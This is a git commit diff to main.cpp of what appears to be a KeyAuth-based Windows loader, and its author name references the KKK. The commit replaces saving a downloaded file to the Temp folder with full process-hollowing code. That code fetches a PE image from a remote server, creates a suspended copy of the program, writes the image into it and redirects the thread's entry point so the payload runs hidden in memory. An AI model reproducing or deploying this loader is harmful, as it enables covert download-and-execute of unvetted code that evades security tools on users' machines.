3ccd3b929a2629ab1b08bd3ecb2b808d0b1086a8
The KKK leader uknow <110284804+alcatrazsolution@users.noreply.github.com>
2022-07-31 05:30:11 +0000

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -312,7 +312,7 @@ int APIENTRY WindownsMain(HINSTANCE, HINSTANCE, LPSTR, int)
 							downloadCode = skCrypt("None");
 							break;
 						case 1:
-							downloadCode = skCrypt("000000"); //file
+							downloadCode = skCrypt("158725"); //file script
 							break;
 						default:
 							downloadCode = skCrypt("None");
@@ -322,11 +322,70 @@ int APIENTRY WindownsMain(HINSTANCE, HINSTANCE, LPSTR, int)
 						if (downloadCode != "None")
 						{
 							std::vector<std::uint8_t> bytes = KeyAuthApp.download(downloadCode);
+							void* pe = bytes.data();
 
-							std::ofstream file(skCrypt(L"C:\Windows\Temp\CrownScript.exe"), std::ios_base::out | std::ios_base::binary);
-							file.write((char*)bytes.data(), bytes.size());
-							file.close();
-							
+							IMAGE_DOS_HEADER* DOSHeader;
+							IMAGE_NT_HEADERS64* NtHeader;
+							IMAGE_SECTION_HEADER* SectionHeader;
+
+							PROCESS_INFORMATION PI;
+							STARTUPINFOA SI;
+							ZeroMemory(&PI, sizeof(PI));
+							ZeroMemory(&SI, sizeof(SI));
+
+							void* pImageBase;
+							char currentFilePath[1024];
+
+							DOSHeader = PIMAGE_DOS_HEADER(pe);
+							NtHeader = PIMAGE_NT_HEADERS64(DWORD64(pe) + DOSHeader->e_lfanew);
+
+							if (NtHeader->Signature == IMAGE_NT_SIGNATURE) {
+								GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
+
+								if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
+									CONTEXT* CTX;
+									CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+									CTX->ContextFlags = CONTEXT_FULL;
+									UINT64 imageBase = 0;
+
+									if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) {
+										pImageBase = VirtualAllocEx(
+											PI.hProcess,
+											LPVOID(NtHeader->OptionalHeader.ImageBase),
+											NtHeader->OptionalHeader.SizeOfImage,
+											MEM_COMMIT | MEM_RESERVE,
+											PAGE_EXECUTE_READWRITE
+										);
+
+										WriteProcessMemory(PI.hProcess, pImageBase, pe, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+
+										for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
+										{
+											SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(pe) + DOSHeader->e_lfanew + 264 + (i * 40));
+
+											WriteProcessMemory(
+												PI.hProcess,
+												LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
+												LPVOID(DWORD64(pe) + SectionHeader->PointerToRawData),
+												SectionHeader->SizeOfRawData,
+												NULL
+											);
+											WriteProcessMemory(
+												PI.hProcess,
+												LPVOID(CTX->Rdx + 0x10),
+												LPVOID(&NtHeader->OptionalHeader.ImageBase),
+												8,
+												NULL
+											);
+										}
+
+										CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+										SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+										ResumeThread(PI.hThread);
+										WaitForSingleObject(PI.hProcess, NULL);
+									}
+								}
+							}
 							exit(0);
 						}
 						else
